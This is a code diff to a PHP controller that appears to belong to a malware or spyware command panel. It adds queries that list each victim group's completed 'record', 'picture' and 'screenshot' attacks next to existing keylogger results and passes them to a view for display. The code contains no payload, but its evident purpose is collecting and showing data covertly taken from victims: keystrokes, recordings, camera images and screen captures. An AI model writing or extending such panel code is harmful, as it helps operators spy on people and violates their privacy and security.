@@ -88,6 +88,24 @@ class NetworkController extends Controller
                             ->where('victim_attacks.state', 'done')
                             ->get();
 
+        $records = VictimAttacks::join('victim_groups', 'victim_attacks.victim_id', '=', 'victim_groups.victim_id')
+                            ->where('victim_groups.group_id', $id)
+                            ->where('victim_attacks.type', 'record')
+                            ->where('victim_attacks.state', 'done')
+                            ->get();
+
+        $pictures = VictimAttacks::join('victim_groups', 'victim_attacks.victim_id', '=', 'victim_groups.victim_id')
+                            ->where('victim_groups.group_id', $id)
+                            ->where('victim_attacks.type', 'picture')
+                            ->where('victim_attacks.state', 'done')
+                            ->get();
+
+        $screenshots = VictimAttacks::join('victim_groups', 'victim_attacks.victim_id', '=', 'victim_groups.victim_id')
+                            ->where('victim_groups.group_id', $id)
+                            ->where('victim_attacks.type', 'screenshot')
+                            ->where('victim_attacks.state', 'done')
+                            ->get();
+
     
         return view('network.show', [
             'group' => $group, 
@@ -95,7 +113,10 @@ class NetworkController extends Controller
             'name' => $name, 
             'victims' => $victims,
             'scan' => $scan,
-            'keyloggers' => $keyloggers
+            'keyloggers' => $keyloggers,
+            'records' => $records,
+            'pictures' => $pictures,
+            'screenshots' => $screenshots
         ]);
     }
 
